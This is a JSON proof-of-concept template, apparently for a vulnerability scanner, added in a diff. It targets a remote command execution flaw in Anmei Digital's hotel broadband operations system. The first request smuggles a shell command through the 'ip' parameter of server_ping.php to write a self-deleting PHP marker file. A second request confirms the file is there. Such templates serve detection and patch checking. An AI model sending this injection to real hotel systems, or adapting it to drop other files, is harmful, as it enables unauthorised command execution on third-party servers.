@@ -1,0 +1,56 @@
+{
+    "Name": "amtt-hiboss-server-ping-rce",
+    "Description": "安美数字-酒店宽带运营系统-远程命令执行漏洞",
+    "Product": "安美数字",
+    "author": "chumeng",
+    "Request":[
+                {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/manager/radius/server_ping.php?ip=127.0.0.1|echo%20\"<?php%20echo%20md5(12123);unlink(__FILE__);?>\">../../12123.php&id=1",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+            {
+                "Operation": "contains",
+                "Key":"",
+                "Value": "parent.doTestResult"
+            },
+            {
+                "Operation": "code",
+                "Key":"",
+                "Value": "200"
+            }
+        ]
+        },
+        "Next_decide":"AND"
+                }, {
+                    "Method": "GET",
+                    "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+                    "Uri":"/12123.php",
+                    "Port":"",
+                    "Data":"",
+                    "Follow_redirects":"false",
+                    "Upload":{"Name": "","fileName": "","filePath": "" },
+                    "Response":{
+                    "Check_Steps":"AND",
+                    "Checks": [
+                        {
+                            "Operation": "contains",
+                            "Key":"",
+                            "Value": "0acf03f408f90ea0dcba786d300620db"
+                        },
+                        {
+                            "Operation": "code",
+                            "Key":"",
+                            "Value": "200"
+                        }
+                    ]
+                    },
+                    "Next_decide":""
+                            }
+]}
